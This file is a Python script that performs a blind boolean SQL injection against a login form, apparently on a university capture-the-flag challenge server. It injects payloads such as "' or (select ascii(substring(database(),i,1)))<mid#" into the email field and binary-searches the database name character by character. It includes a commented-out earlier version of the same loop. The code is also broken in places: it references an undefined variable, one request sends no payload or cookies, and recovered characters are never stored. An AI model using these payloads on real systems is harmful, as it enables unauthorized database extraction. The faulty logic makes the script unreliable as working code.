import requests
import string

allchar = [chr(i) for i in xrange(127)]

print("beginning attempt")
cookies = {"CHALBROKER_USER_ID":"joe215"}
url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?"
#data = {"email":"' or ASCII(substring(database(), "+str(i)+", "+str(i)+"))="+character+"#;-- !","password":"ahdjasd"}
final = []
i = 1

while i <= 7:
	print("Cracking character: " + str(i))
	top = 126
	bottom = 0
	while(top>bottom):
		mid = (top + bottom)//2
		print(top, mid, bottom)
		data = {"email":"' or (select ascii(substring(database()," + str(i) + ", 1)))=" + str(mid) + "#;--!", "password":"ahdjasd"}
		req = requests.post(url, cookies=cookies, data=data)
		if "Welcome" in req.text:
			print("Database character:" + str(allchar[x]))
			break
		data = {"email":"' or (select ascii(substring(database()," + str(i) + ", 1)))<" + str(mid) + "#;--!", "password":"ahdjasd"}
		req = requests.post(url, cookies=cookies, data=data)
		if "Welcome" in req.text:
			print("l")
			bottom = bottom
			top = mid-1
		data = {"email":"' or (select ascii(substring(database()," + str(i) + ", 1)))>" + str(mid) + "#;--!", "password":"ahdjasd"}
		req = requests.post(url)
		if "Welcome" in req.text:
			print("l")
			bottom = mid + 1
			top = top
		
	i += 1
	'''
	while (top > bottom):
		mid = (top + bottom)//2
		#checking if equal to mid
		data = {"email":"' OR SELECT(ASCII(SUBSTRING(database(),"+str(i)+", 1)))="+str(mid)+"#;-- !","password":"ahdjasd"}
		req = requests.post(url, cookies = cookies, data = data)
		if "Welcome" in req.text:
			print("Database name character:" + str(allchar[mid]))
			final.append(allchar[mid])
			break
		#checking if less than mid
		data = {"email":"' OR SELECT(ASCII(SUBSTRING(database(),"+str(i)+", 1)))<"+str(mid)+"#;-- !", "password":"ahdjasd"}
		req = requests.post(url, cookies=cookies, data=data)
		if "Welcome" in req.text:
			print("l")
			bottom = bottom
			top = mid - 1
			break
		#checking if greater than mid
		data = {"email":"' OR SELECT(ASCII(SUBSTRING(database(),"+str(i)+", 1)))>"+str(mid)+"#;--!", "password":"ahdjasd"}
		req = requests.post(url, cookies=cookies, data=data)
		if "Welcome" in req.text:
			print("g")
			top = top
			bottom = mid + 1
			break
		print("uh oh")
	'''